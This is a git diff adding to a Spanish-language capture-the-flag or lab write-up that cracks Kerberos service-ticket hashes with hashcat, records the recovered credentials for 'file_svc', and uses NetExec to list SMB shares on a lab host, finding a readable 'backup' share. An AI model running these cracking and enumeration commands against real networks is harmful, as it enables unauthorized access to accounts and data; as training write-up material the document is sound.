@@ -77,3 +77,30 @@ Y los crackeamos
 hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt
 ```
 
+Descubrimos unas credenciales
+```ad-hint
+file_svc::Password123!!
+```
+
+## Enumeración de recursos compartidos
+Enumeraremos los recursos compartidos a los que puede acceder este usuario
+
+```shell
+nxc smb 10.114.135.170 -u 'file_svc' -p 'Password123!!' --shares
+```
+
+encontramos
+```shell
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+backup          READ            
+C$                              Default share
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share
+SYSVOL          READ            Logon server share
+Users                           
+```
+
+Vemos el recurso compartido de `backup` que tenemos permisos de lectura sobre el accedemos a el
+
